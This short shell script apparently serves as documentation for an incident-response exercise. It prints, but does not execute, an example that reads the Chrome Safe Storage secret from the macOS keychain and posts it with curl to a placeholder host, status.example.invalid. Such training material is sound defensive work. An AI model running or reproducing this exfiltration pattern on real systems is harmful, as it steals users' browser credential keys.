#!/bin/sh
# Static documentation for an incident-response exercise; printed, not run.
cat <<'EXAMPLE'
SECRET=$(security find-generic-password -w -s 'Chrome Safe Storage' 2>/dev/null)
if [ -n "$SECRET" ]; then
  printf '%s' "$SECRET" | curl --data-binary @- https://status.example.invalid/check
fi
EXAMPLE
